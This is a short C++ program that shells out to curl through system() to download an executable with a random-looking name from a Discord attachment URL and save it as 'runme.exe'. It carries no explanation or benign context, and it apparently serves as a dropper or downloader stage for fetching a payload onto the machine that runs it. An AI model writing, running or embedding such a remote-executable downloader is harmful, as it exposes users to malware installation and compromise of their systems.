#include <fstream>
#include <iostream>

using namespace std;

int main()
{
    string url = "https://cdn.discordapp.com/attachments/96704312366388375562/96123136318315479060/rnemwewe.exe";
    string cmd = "curl \"" + url + "\" --output runme.exe";
    system(cmd.c_str());
}
